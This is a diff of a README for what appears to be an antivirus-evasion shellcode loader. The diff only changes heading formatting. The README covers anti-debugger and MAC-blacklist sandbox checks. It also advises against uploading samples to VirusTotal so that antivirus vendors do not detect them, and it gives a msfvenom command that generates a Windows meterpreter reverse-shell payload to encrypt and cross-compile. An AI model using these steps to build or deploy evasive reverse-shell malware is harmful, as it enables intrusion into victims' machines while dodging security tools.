@@ -28,13 +28,13 @@
 </p>
 
 
-- ## :warning: Atention!!!
+## :warning: Atention!!!
 **To check if the antivirus is detecting the malware, NEVER send it to the virustotal, IT WILL BE SENT TO THE ANTIVIRUS COMPANIES AND WILL BE BROKEN, to analyze, send it to https://www.hybrid-analysis.com/ and remember to check the option "Do not send my sample to non-affiliated third parties", as in the example below.**
 
 
 
 
-- ## :bomb: Bypass Techniques
+## :bomb: Bypass Techniques
 
 ### **Anti-Debugger**
 
@@ -55,7 +55,7 @@ To try bypass the Debuggers, I'm using the "IsDebuggerPresent()" of "Windows.h" 
   Gets the system mac address and compare to the macs, in the black-list, if the system mac address is equal to any mac in the black-list returns -1 (identified).
 
 
-- ## :radioactive: Generating the Shellcode
+## :radioactive: Generating the Shellcode
 ![Generating](/assets/generating%20shellcode.gif)
 
 To generate the shellcode type in the terminal: ``` msfvenom -p windows/meterpreter/reverse_shell lhost=(IP) lport=(PORT) -f c ```, copy the shellcode generated and encrypt it.                                                                                                 
@@ -66,17 +66,17 @@ On windows type: ``` encrypt_shellcode.exe e "(KEY, ex: "\xda\xe6\x1d\x5c\x9v\x8
 
 
 
-- ## :computer: How to compile for Windows on Linux
+## :computer: How to compile for Windows on Linux
 
 To compile for Windows on Linux, first, install mingw-w64: ``` sudo apt-get install mingw-w64 ```, then, to compile for 32 bits: ``` i686-w64-mingw32-gcc -o main.exe main.c -l psapi -static ```, and to 64 bits: ``` x86_64-w64-mingw32 -o main.exe main.c -l psapi -static ```
 
--  ## :book: Credits
+## :book: Credits
 
 Credits for https://github.com/rastating, the encrypt_shellcode is based on a post of your github.io: https://rastating.github.io/creating-a-shellcode-crypter/
 
 
 
-- ## :memo: License
+## :memo: License
 
 This project is under MIT license. See at here [LICENSE](/LICENSE.md) for more informations.
 
